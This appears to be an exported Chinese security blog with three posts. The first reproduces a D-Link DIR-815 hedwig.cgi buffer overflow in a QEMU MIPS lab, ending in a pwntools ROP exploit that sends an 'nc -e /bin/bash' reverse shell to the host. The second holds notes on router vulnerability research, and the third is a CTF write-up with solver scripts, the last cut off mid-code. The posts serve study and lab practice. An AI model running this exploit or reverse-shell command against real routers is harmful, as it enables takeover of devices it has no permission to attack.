1sudo apt-get install bridge-utils uml-utilities 在宿主机编写如下文件保存为net.sh并运行： 1234567891011121314sudo sysctl -w net.ipv4.ip_forward=1sudo iptables -Fsudo iptables -Xsudo iptables -t nat -Fsudo iptables -t nat -Xsudo iptables -t mangle -Fsudo iptables -t mangle -Xsudo iptables -P INPUT ACCEPTsudo iptables -P FORWARD ACCEPTsudo iptables -P OUTPUT ACCEPTsudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADEsudo iptables -I FORWARD 1 -i tap0 -j ACCEPTsudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPTsudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0 然后配置qemu虚拟系统的路由，在qemu虚拟系统中编写net.sh并运行： 123#！/bin/sh ifconfig eth0 192.168.100.2 netmask 255.255.255.0route add default gw 192.168.100.254 eth0的网卡是192.168.100.2并且可以和宿主机ping通表示成功 随后使用scp命令将binwalk解压出来的squashfs-root文件夹上传到qemu系统中的**&#x2F;root**路径下： 1scp -r squashfs-root/ root@192.168.100.2:/root 然后在qemu虚拟系统中将squashfs-root文件夹下的库文件替换掉原有的，此操作会改变文件系统，如果不小心退出了虚拟系统，再次启动qemu时会失败，原因是因为改变了文件系统的内容。此时需要使用新的文件系统，因此在此操作之前可以先备份一份。编写auto.sh并执行： 123456789101112131415cp sbin/httpd /cp -rf htdocs/ /rm -rf /etc/servicescp -rf etc/ /cp lib/ld-uClibc-0.9.30.1.so /lib/cp lib/libcrypt-0.9.30.1.so /lib/cp lib/libc.so.0 /lib/cp lib/libgcc_s.so.1 /lib/cp lib/ld-uClibc.so.0 /lib/cp lib/libcrypt.so.0 /lib/cp lib/libgcc_s.so /lib/cp lib/libuClibc-0.9.30.1.so /lib/cd /ln -s /htdocs/cgibin /htdocs/web/hedwig.cgiln -s /htdocs/cgibin /usr/sbin/phpcgi 接下来在qemu虚拟系统的根目录（ &#x2F; ）下，创建一个名为conf的文件，此文件是httpd服务的配置文件。内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172Umask 026PIDFile /var/run/httpd.pidLogGMT On #开启logErrorLog /log #log文件Tuning&#123; NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60&#125;Control&#123; Types &#123; text/html &#123; html htm &#125; text/xml &#123; xml &#125; text/plain &#123; txt &#125; image/gif &#123; gif &#125; image/jpeg &#123; jpg &#125; text/css &#123; css &#125; application/octet-stream &#123; * &#125; &#125; Specials &#123; Dump &#123; /dump &#125; CGI &#123; cgi &#125; Imagemap &#123; map &#125; Redirect &#123; url &#125; &#125; External &#123; /usr/sbin/phpcgi &#123; php &#125; &#125;&#125;Server&#123; ServerName &quot;Linux, HTTP/1.1, &quot; ServerId &quot;1234&quot; Family inet Interface eth0 #网卡 Address 192.168.100.2 #qemu的ip地址 Port &quot;4321&quot; #对应web访问端口 Virtual &#123; AnyHost Control &#123; Alias / Location /htdocs/web IndexNames &#123; index.php &#125; External &#123; /usr/sbin/phpcgi &#123; router_info.xml &#125; /usr/sbin/phpcgi &#123; post_login.xml &#125; &#125; &#125; Control &#123; Alias /HNAP1 Location /htdocs/HNAP1 External &#123; /usr/sbin/hnap &#123; hnap &#125; &#125; IndexNames &#123; index.hnap &#125; &#125; &#125;&#125; 最后启动httpd服务： 1./httpd -f conf 这里访问失败是因为hedwig.cgi服务没有收到请求，需要提前配置qemu虚拟环境中的REQUEST_METHOD等方法，因为httpd是读取的环境变量，这里就直接通过环境变量进行设置： 12345export CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;export HTTP_COOKIE=&quot;uid=1234&quot; 这里在qemu虚拟系统中运行hedwig.cgi，再次访问http://192.168.100.2:4321/hedwig.cgi就可以正常收到内容了 接下来就是使用gdbserver对hedwig.cgi进行调试了。 gdbserver调试动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 注：正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制 这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的 gdbserver auto.shell 1234567#!/bin/bashexport CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export HTTP_COOKIE=&quot;uid=`cat content`&quot; #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;echo &quot;uid=1234&quot;|./gdbserver 192.168.100.254:8888 /htdocs/web/hedwig.cgi #IP为宿主机IP 宿主机连接 gdbserver 123gdb-multiarch htdocs/cgibinset architecture mipstarget remote 192.168.100.2:8888 #对应qemu地址和端口 这里我们终于可以看到vmmap 接下来是确定libc的基地址，需要先把环境变量配置好，不然&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。 利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来） 1/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps a&amp;b 先执行a，在执行b，无论a成功与否都会执行b。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。 123456789101112131415161718192021222324252627export CONTENT_LENGTH=&quot;100&quot;root@debian-mipsel:~# export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;root@debian-mipsel:~# export HTTP_COOKIE=&quot;uid=1234&quot;root@debian-mipsel:~# export REQUEST_METHOD=&quot;POST&quot;root@debian-mipsel:~# export REQUEST_URI=&quot;/hedwig.cgi&quot;root@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps[2] 1224cat: /proc/pid/maps: No such file or directoryroot@debian-mipsel:~# /htdocs/web/hedwig.cgi &amp; cat /proc/1226/maps[3] 122600400000-0041c000 r-xp 00000000 08:01 32694 /htdocs/cgibin0042c000-0042d000 rw-p 0001c000 08:01 32694 /htdocs/cgibin0042d000-0042f000 rwxp 00000000 00:00 0 [heap]77f34000-77f92000 r-xp 00000000 08:01 547906 /lib/libc.so.077f92000-77fa1000 ---p 00000000 00:00 0 77fa1000-77fa2000 r--p 0005d000 08:01 547906 /lib/libc.so.077fa2000-77fa3000 rw-p 0005e000 08:01 547906 /lib/libc.so.077fa3000-77fa8000 rw-p 00000000 00:00 0 77fa8000-77fd1000 r-xp 00000000 08:01 546761 /lib/libgcc_s.so.177fd1000-77fe1000 ---p 00000000 00:00 0 77fe1000-77fe2000 rw-p 00029000 08:01 546761 /lib/libgcc_s.so.177fe2000-77fe7000 r-xp 00000000 08:01 547907 /lib/ld-uClibc.so.077ff5000-77ff6000 rw-p 00000000 00:00 0 77ff6000-77ff7000 r--p 00004000 08:01 547907 /lib/ld-uClibc.so.077ff7000-77ff8000 rw-p 00005000 08:01 547907 /lib/ld-uClibc.so.07ffd6000-7fff7000 rwxp 00000000 00:00 0 [stack]7fff7000-7fff8000 r-xp 00000000 00:00 0 [vdso] 编写exp（注意是py2 123456789101112131415161718192021222324252627#!/usr/bin/python2from pwn import *context.endian = &quot;little&quot;context.arch = &quot;mips&quot;base_addr = 0x77f34000system_addr_1 = 0x53200-1gadget1 = 0x45988gadget2 = 0x159cc cmd = &#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;padding = &#x27;A&#x27; * 973 #1009-4*9padding += p32(base_addr + system_addr_1) # s0padding += p32(base_addr + gadget2) # s1padding += &#x27;A&#x27; * 4 # s2padding += &#x27;A&#x27; * 4 # s3padding += &#x27;A&#x27; * 4 # s4padding += &#x27;A&#x27; * 4 # s5padding += &#x27;A&#x27; * 4 # s6padding += &#x27;A&#x27; * 4 # s7padding += &#x27;A&#x27; * 4 # fppadding += p32(base_addr + gadget1) # rapadding += &#x27;B&#x27; * 0x10padding += cmd f = open(&quot;context&quot;,&#x27;wb&#x27;)f.write(padding)f.close() 生成的context通过scp拷贝到mips虚拟机目录中并且在目录下创造debug.sh 123456export CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export HTTP_COOKIE=&quot;uid=`cat context`&quot;export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;echo &quot;uid=1234&quot;|/htdocs/web/hedwig.cgi 在宿主机运行 1nc -vlp 9999 然后再mips虚拟机执行debug.sh getshell ! 总结： 断断停停终于算是真正完整复现了第一个漏洞，dlink DIR-815，依照0day路由器漏洞挖掘还有师傅们的博客，对mips架构和qemu有了进一步的了解","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"家用路由器0day挖掘技术阅读笔记","slug":"家用路由器0day挖掘技术阅读笔记","date":"2022-08-15T16:00:00.000Z","updated":"2022-10-13T08:04:21.157Z","comments":true,"path":"2022/08/16/家用路由器0day挖掘技术阅读笔记/","link":"","permalink":"http://example.com/2022/08/16/%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","excerpt":"","text":"第四章 路由器web漏洞xss利用站点内的信任用户，跨站攻击是指入侵者在远程web页面的HTML页面中插入具有恶意代码的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面时，嵌入其中的脚本将被解释执行。 CSRF跨站请求伪造通过伪装来自受信任用户的请求达到利用受信任的网站的目的。 第五章 路由器后门漏洞第六章 路由器溢出漏洞MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处，但又有很大的区别。区别具体体现在： 栈操作：与x86架构一样，都是向低地址增长的。但是没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的栈帧存储存储区域。 调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为调用参数空间。 参数传递方式：前四个参数通过$a0-$a3传递，多余的参数会放入调用参数空间。 返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。 叶子函数：当前函数不再调用其他函数。非叶子函数：当前函数调用其他函数。 函数调用的过程：父函数调用子函数时，复制当前$PC的值到$RA寄存器，然后跳到子函数执行；到子函数时，子函数如果为非叶子函数，则子函数的返回地址会先存入堆栈，否则仍在$RA寄存器中；返回时，如果子函数为叶子函数，则”jr $ra”直接返回，否则先从堆栈取出再返回。 利用堆栈溢出的可行性：在非叶子函数中，可以覆盖返回地址，劫持程序执行流程；而在非叶子函数中，可通过覆盖父函数的返回地址实现漏洞利用。 第七章 基于MIPS的shellcode开发mips中可使用syscall指令来进行系统调用，调用的方法为：在使用系统调用syscall之前，$v0保存需要执行的系统调用的调用号，并且按照mips调用规则构造将要执行的系统调用参数。syscall调用的伪代码为：“syscall($v0,$a1,$a2,$a3,$a4…)”。 shellcode编码优化包括指令优化和shellcode编码。指令优化：指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符。 通常来说，shellcode可能会受到限制：首先，所有的字符串函数都会对“NULL”字节进行限制；其次，在某些处理流程中可能会限制0x0D（\\r）、0x0A（\\n）、或者0x20（空格）字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。 绕过以上限制的方法主要有两个：指令优化及shellcoe编码。后者更为通用。 shellcoe编码通常包含以下三种：base64编码、alpha_upper编码、xor编码。 第八章 路由器文件系统与提取路由器漏洞的分析与利用的关键环节有获取固件、提取文件系统、漏洞分析与利用及漏洞挖掘。其中获取固件及提取文件系统是进行漏洞分析与利用的基础。 路由器固件中包含操作系统的内核及文件系统。路由器的固件不是硬件而是软件，因为在路由器中它通常是被固化在只读存储器中，所以称为固件。 在进行漏洞分析时获取路由器的固件通常有两种方式：一种是从路由器厂商提供的更新网站下载；一种是通过硬件接入，从路由器的Flash中提取固件。 文件系统文件系统是操作系统的重要组成部分，是操作运行的基础。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器总是希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2），在路由器中被普遍采用。 手动提取文件系统文件系统中包含实现路由器各种功能的基础应用程序。文件系统能从固件中提取，而从路由器固件中提取文件系统是一个难点，原因之一在于不同的操作系统使用的文件系统不同。另外，路由器的文件系统压缩算法也有差异，有些路由器甚至会使用非标准的压缩算法打包文件系统。 手动提取文件系统类型包括： 使用file命令查看文件系统类型。 手动判断文件类型，包含如下步骤：”strings|grep”检索文件系统magic签名头；“hexdump|grep”检索magic签名偏移；“dd|file”确定magic签名偏移处的文件类型。 手动提取文件系统。：安装工具，sudo apt-get install squashfs-tools该工具目前仅支持GZIP、LZO、XZ（LZMA2）不支持LZMA格式。可以使用firmware-mod-kit解压缩，解压后得到所有文件。安装命令： 1234git clone https://github.com/mirror/firmware-mod-kit.gitsudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magiccd firmware-mod-kit./configure &amp;&amp; make 自动提取文件系统binwalk是路由器固件分析的必备工具，该工具最大的优点是可以自动完成指令文件的扫描，智能发掘潜藏在文件中所有可疑地文件类型及文件系统。 binwalk&amp;&amp;libmagic binwalk提取与分析过程： 固件扫描。通过扫描binwalk可发现目标文件中包含的所有可识别文件类型。 1binwaklk firmware.bin 提取文件。选项“-e”和“–extract”用于按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统。选项“-M”，用于递归扫描。“-d”用于递归深度的限制。 1binwaklk -e firmware.bin 显示完整的扫描结果。选项“-I”或“–invalid”用于显示扫描的所有结果。 指令系统分析。选项“-A”和“–opcode”用于扫描指定文件中通用cpu架构的可执行代码。 1binwaklk -A 70|more 通常binwalk可对绝大多数路由器固件进行文件提取，如遇到无法识别的固件，可向binwalk添加下列提取规则和提取方法，实现对新的文件系统进行扫描和提取： 基于magic签名文件自动提取。 基于binwalk配置文件的提取。 第九章 漏洞分析简介漏洞分析是指在代码中迅速定位漏洞，弄清攻击原理，准确地估计潜在的漏洞利用方式和风险等级的过程。 POC（Proof of Concept） 漏洞证明，漏洞报告中，通过一段描述或一个样例来证明漏洞确实存在 EXP（Exploit） 漏洞利用，某个漏洞存在EXP，意思就是该漏洞存在公开的利用方式（比如一个脚本） 漏洞分析方法可以通过一些漏洞公布网站获取漏洞信息。网上公布的poc有很多形式，只要能触发漏洞、重现攻击过程即可。在得到poc后，就需要部署漏洞分析实验环境，利用poc重现攻击过程，定位漏洞函数，分析漏洞产生的具体原因，根据poc和漏洞情况实现对漏洞的利用。 漏洞分析中常用的两种分析方法：动态调试以及静态分析。 第十六章 路由器硬件的提取路由器flashFLASH 也叫闪存，是路由器中常用的一种内存类型。它是可读写的存储器，在系统重新启动或关机之后仍能保存数据。FLASH中存放着当前正在使用的路由器操作系统等信息 bootloader:主要功能是对硬件环境进行初始化、更新固件及认识操作系统的文件格式并将内核加载到内存中去执行。“CFE”是“Common Firmware Environment”（统一固件环境）的缩写，它是 Broadcom公司专门针对自己生产的MIPS 架构的处理器开发的一款Bootloader软件，Linksys WRT54G v2路由器使用的就是CFE。Kernel:操作系统的内核。Root Filesystem:操作系统的根文件系统，如 squashfs、rootfs等。NVRAM:作用是保存路由器中的配置文件。路由器在启动之后会从NVRAM中读取配置文件，对路由器进行设置。用户修改路由器设置后，系统会将修改后的参数写回NVRAM中。 硬件提取的思路通过路由器主板上的JTAG 接口提取FLASH、NVRAM等。这种方法的优点是只需要一根 JTAG线，不需要太多的辅助设备，缺点是需要路由器CPU支持JTAG，主板上要有JTAG接口。 从主板上取下的 FLASH芯片中提取。这种方法可以在路由器不支持JTAG 方式时使用，但缺点也很明显——从主板上取出芯片可能会对路由器造成物理损伤。 使用测试夹从FLASH芯片中提取。使用测试夹的优点是不需要从路由器上取下芯片，只需要用测试夹夹住芯片引脚即可，缺点是对不同引脚数的FLASH芯片需要使用对应的测试夹。 路由器串口在路由器中，我们要寻找的串口指UART（通用异步收发器），它是路由器设备中比较常见的一种接口。 首先，我们通过肉眼观察路由器主板上的引脚。一般来说，UART至少包含以下4个引脚。Vcc (vcC) :电源电压。该引脚电压较稳定。 rGround (GND):接地。该引脚电压通常为0。 Transmit(TXD):数据发送引脚。 Receive (RXD):数据接收引脚。 辨别引脚： 目测： ( 1 ) VCC引脚的特点VCC 引脚通常被做成方形。从路由器主板上可以看到较宽的走线，那么该引脚极有可能也是VCC引脚( 2 )GND引脚的特点GND引脚通常存在多条走线连接到周围的地线（GND)。 万用表： ( 1）测试GND引脚将万用表调到电阻测量的最小档。然后，我们需要确定万用表的两只表笔应该放在哪些位置。通常金属屏蔽是一个方便测试的接地点，因此，将一只表笔放在金属屏蔽罩上，用另一只表笔分别接触10 个引脚，测试金属屏蔽罩与串口的10个引脚，电阻为0的引脚即为GND引脚。 （2）测试VCC引脚 虽然VCC 引脚对于我们使用路由器的串口是无关紧要的，但是确定 VCC 引脚可以排除它作为RXD引脚和TXD引脚的可能性，因此也是有必要的。在目测中，我们怀疑1号和2号引脚是VCC 引脚，那么接下来我们就用万用表来验证这一猜测。 ( 3 ）测试TXD引脚当串行端口处于激活状态并发送数据（否则无法测试出发送引脚）时，发送引脚是相当容易识别的。主板上的发送引脚被拉高到与VCC引脚相同的电压，通常是3.3伏特。在有数据发送时，电压将下降到0。当读取的是一个不断变化的直流电压时，数字万用表将显示最终的平均采样电压。因此，如果万用表显示引脚电压下降，表示该引脚有数据发送，由此可以判断该引脚是TXD引脚。在路由器中，引导程序、内核、系统的所有启动信息都将被打印到串口，因此，我们测试TXD引脚的最佳时机就在系统启动阶段。 在识别了串口的各个引脚之后，我们就可以通过一条USB 转 UART 适配器的TTL-232R-3V3线连接进行连接了。将UART 适配器的USB接口端插入计算机的USB 接口，将UART适配器连接到路由器串行端口中，使用方式如下。将适配器的GND连接到串口的GND。将适配器的RXD连接到串口的 TXD。将适配器的TXD连接到串口的RXD。接下来，我们开始进行硬件连接的准备工作。 将适配器的GND连接到串口的GND。 将适配器的RXD连接到串口的TXD。 将适配器的TXD连接到串口的RXD。 硬件方面的操作到这里基本上已经完成了，接下来，我们需要检查串行端口的协议设置。串行端口有多种设置，但是在这里我们只需要完成波特率的设置即可。尝试错误是识别波特率最快和最简单的方法。因为串行端口通常用于显示调试信息（即它们发送 ASCII 数据），并且只有少数可能频率的波特率，所以我们可以循环逐一测试可能的波特率，直到输出可理解的数据（如ASCII码)时，就找到了当前串口的波特率。 读取路由器数据1．通过miniterm.py连接路由器串口 2．路由器CFE命令模式 3．路由器Linux系统模式 FLASH 芯片中存储了路由器的固件，其中包含路由器的 bootloader信息。因为每个路由器厂商在对操作系统进行编码和压缩的时候可能会使用一些非标准的算法，因此，有些时候，提取和分析 bootloader也是很有必要的。在无法通过网络下载路由器固件的时候，我们可以通过JTAG方式读取路由器FLASH中的固件，对文件系统及 bootloader进行提取和分析。 路由器的配置文件都存放在 NVRAM中，因此，通过读取NVRAM可以得到路由器的所有配置信息。使用brjtag 读取路由器NVRAM的基本命令如下。brjtag -backup:nvram:备份NVRAM。brjtag -crase:nvram:擦除NVRAM。brjtag -flash:nvram:写入NVRAM。 第十七章 路由器漏洞挖掘技术审计： (1）部分用户提供数据来源的相关函数命令行参数: argv操作。环境变量: getenv()。 输入数据文件: read()、fscanf()、getc()、fgetc()、fgets()、vfscanf()。 键盘输入&#x2F;stdin: read()、scanf(）、getchar()、gets()。 网络数据: read()、recv()、 recvfrom()。(2）部分数据操作相关的危险函数字符串复制: strcpy). strncpyO。 命令执行: system()、execve()系列。字符串合并:strcat()。 格式化字符串: sprintf()、snprintf()。在目标程序中，定位以上危险函数，然后根据危险函数参数个数、类型跟踪各参数，分析各缓冲区大小，判断是否存在安全漏洞。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"强网杯","slug":"强网杯","date":"2022-08-01T16:00:00.000Z","updated":"2022-08-07T13:32:49.815Z","comments":true,"path":"2022/08/02/强网杯/","link":"","permalink":"http://example.com/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF/","excerpt":"","text":"GameMaster.net程序 主要逻辑为异或和aes加密，解密message文件 12345678910111213from Crypto.Cipher import AESkey=bytes([66,114,97,105,110,115,116,111,114,109,105,110,103,33,33,33])f=open(&#x27;gamemessage&#x27;,&#x27;rb&#x27;)stream=f.read()enc=[]for i in stream: enc.append(i^34)ae=AES.new(key,AES.MODE_ECB)m=ae.decrypt(bytes(enc))f.close()ff=open(&#x27;flag&#x27;,&#x27;wb&#x27;)ff.write(m)ff.close() 得到文件用010edit打开，然后根据文件头提取文件，也是.net文件，dnspy打开 12345678910111213141516171819from z3 import *f=[101,5,80,213,163,26,59,38,19,6,173,189,198,166,140,183,42,247,223,24,106,20,145,37,24,7,22,191,110,179,227,5,62,9,13,17,65,22,37,5]x=BitVec(&#x27;x&#x27;,33)y=BitVec(&#x27;y&#x27;,33)z=BitVec(&#x27;z&#x27;,33)s=Solver()nums=-1k=[0]*40for i in range(320): x = (((x &gt;&gt; 29 ^ x &gt;&gt; 28 ^ x &gt;&gt; 25 ^ x &gt;&gt; 23) &amp; 1) | x &lt;&lt; 1) y = (((y &gt;&gt; 30 ^ y &gt;&gt; 27) &amp; 1) | y &lt;&lt; 1) z = (((z &gt;&gt; 31 ^ z &gt;&gt; 30 ^ z &gt;&gt; 29 ^ z &gt;&gt; 28 ^ z &gt;&gt; 26 ^ z &gt;&gt; 24) &amp; 1) | z &lt;&lt; 1) if i%8==0: nums+=1 k[nums]=((k[nums]&lt;&lt;1)|((z &gt;&gt; 32 &amp; 1 &amp; (x &gt;&gt; 30 &amp; 1)) ^ (((z &gt;&gt; 32 &amp; 1) ^ 1) &amp; (y &gt;&gt; 31 &amp; 1))))&amp;0xfffor i in range(40): s.add(k[i]==f[i])if s.check()==sat: print(s.model()) 还有移位然后异或的操作 123456789101112131415s=[60,100,36,86,51,251,167,108,116,245,207,223,40,103,34,62,22,251,227]z = 3131229747y = 868387187x = 156324965L[0]=xL[1]=yL[2]=zfor i in range(3): for j in range(4): key[i * 4 + j] = ((L[i] &gt;&gt; j * 8) &amp; 255)for i in range(len(s)): print(chr(s[i]^key[i%len(key)]),end=&#x27;&#x27;)#Y0u_@re_G3meM3s7er! deeprevGooglectf的一道同类型题，找到网上的脚本，format_addr函数修改了一下 GoogleCTF 2022 - eldar (333 pt &#x2F; 14 solves) (harrisongreen.me) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549# Author: hgarrereyn# Desc: Lifter solution for GoogleCTF 2022 eldarimport lieffrom collections import namedtuplefrom dataclasses import dataclassfrom typing import Anyfrom capstone import *md = Cs(CS_ARCH_X86, CS_MODE_64)b = Nonetry: b = lief.ELF.parse(&#x27;./deeprev&#x27;)except: raise Exception(&#x27;Must have the ./eldar binary in cwd&#x27;)rela = [x for x in b.sections if x.name == &#x27;.rela.dyn&#x27;][0]print(rela)dynsym = [x for x in b.sections if x.name == &#x27;.dynsym&#x27;][0]@dataclassclass Symbol(object): idx: int def __repr__(self): return f&#x27;s&#123;self.idx&#125;&#x27; @dataclassclass Reloc(object): idx: int def __repr__(self): return f&#x27;r&#123;self.idx&#125;&#x27;@dataclassclass Ref(object): val: Any def __repr__(self): return f&#x27;&amp;&#123;self.val&#125;&#x27;@dataclassclass SymAddr(object): sym: Symbol field: str def __repr__(self): return f&#x27;&#123;self.sym&#125;.&#123;self.field&#125;&#x27;@dataclassclass RelocAddr(object): reloc: Reloc field: str def __repr__(self): return f&#x27;&#123;self.reloc&#125;.&#123;self.field&#125;&#x27; def vaddr(self): off = 0 match self.field: case &#x27;r_address&#x27;:off = 0 case &#x27;r_info&#x27;: off = 8 case &#x27;r_addend&#x27;: off = 16 return (self.reloc.idx * 24) + off + rela.virtual_address @dataclassclass FlagAddr(object): idx: int def __repr__(self): return f&#x27;flag[&#123;self.idx&#125;]&#x27;@dataclassclass OutAddr(object): idx: int def __repr__(self): return f&#x27;out[&#123;self.idx&#125;]&#x27; @dataclassclass ArrAddr(object): idx: int def __repr__(self): return f&#x27;arr[&#123;self.idx&#125;]&#x27;BaseAddr = namedtuple(&#x27;baseaddr&#x27;, [])FailAddr = namedtuple(&#x27;fail&#x27;, [])def format_addr(addr: int): if addr &gt;= rela.virtual_address and addr &lt; rela.virtual_address + rela.size: offset = addr - rela.virtual_address r_offset = (offset // 24) r_rem = offset % 24 if r_offset &gt;= 3 and r_offset &lt;= 88: arr_idx = (r_offset - 3) * 3 + (r_rem // 8) return ArrAddr(arr_idx) elif r_offset == 89: return OutAddr(r_rem) match r_rem: case 0: return RelocAddr(Reloc(r_offset), &#x27;r_address&#x27;) case 8: return RelocAddr(Reloc(r_offset), &#x27;r_info&#x27;) case 16: return RelocAddr(Reloc(r_offset), &#x27;r_addend&#x27;) case _: return RelocAddr(Reloc(r_offset), r_rem) elif addr &gt; dynsym.virtual_address and addr &lt; dynsym.virtual_address + dynsym.size: offset = addr - dynsym.virtual_address r_offset = (offset // 24) r_rem = offset % 24 match r_rem: case 0: return SymAddr(Symbol(r_offset), &#x27;st_name&#x27;) case 8: return Symbol(r_offset) case 16: return SymAddr(Symbol(r_offset), &#x27;st_size&#x27;) case _: return SymAddr(Symbol(r_offset), r_rem) elif addr &gt;= 0x404040 and addr &lt; 0x404040+33: off = addr-0x404040 return FlagAddr(off) elif addr == 0x804000: return BaseAddr() elif addr == 0x404064: return FailAddr() else: return addrdef to_sym(name): assert len(name) == 1 return Symbol(ord(name[0]))Rel = namedtuple(&#x27;REL&#x27;, [&#x27;dst&#x27;,&#x27;val&#x27;,&#x27;ridx&#x27;])Copy = namedtuple(&#x27;CPY&#x27;, [&#x27;dst&#x27;, &#x27;symbol&#x27;, &#x27;ridx&#x27;])R64 = namedtuple(&#x27;R64&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])R32 = namedtuple(&#x27;R32&#x27;, [&#x27;dst&#x27;,&#x27;symbol&#x27;,&#x27;addend&#x27;,&#x27;ridx&#x27;])def parse(b) -&gt; list: print(&#x27;[*] Loading relocations...&#x27;) relocs = list(b.relocations) print(&#x27;[*] Parsing...&#x27;) instructions = [] for i in range(3, len(relocs)): r = relocs[i] match r.type: case 1: # R64 instructions.append(R64(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) case 5: # CPY instructions.append(Copy(format_addr(r.address), to_sym(r.symbol.name), i)) case 8: # REL instructions.append(Rel(format_addr(r.address), format_addr(r.addend), i)) case 10: # R32 instructions.append(R32(format_addr(r.address), to_sym(r.symbol.name), format_addr(r.addend), i)) return instructionsMov = namedtuple(&#x27;mov&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;sz&#x27;, &#x27;ridx&#x27;])Add = namedtuple(&#x27;add&#x27;, [&#x27;dst&#x27;, &#x27;src&#x27;, &#x27;addend&#x27;, &#x27;ridx&#x27;])def lift_mov_add(instructions): idx = 0 sizes = [] curr = [8] * 8 sizes.append(curr) for instr in instructions: c = list(curr) match instr: case Rel(SymAddr(Symbol(idx), &#x27;st_size&#x27;), val, ridx): c[idx] = val sizes.append(c) while idx &lt; len(instructions): match instructions[idx]: case Rel(dst, val, ridx): instructions[idx] = Mov(dst, Ref(val), 8, ridx) case Copy(dst, sym, ridx): instructions[idx] = Mov(dst, sym, sizes[idx][sym.idx], ridx) case R64(dst, sym, add, ridx): instructions[idx] = Add(dst, sym, add, ridx) idx += 1 return instructionsdef remove_sizes(instructions): # 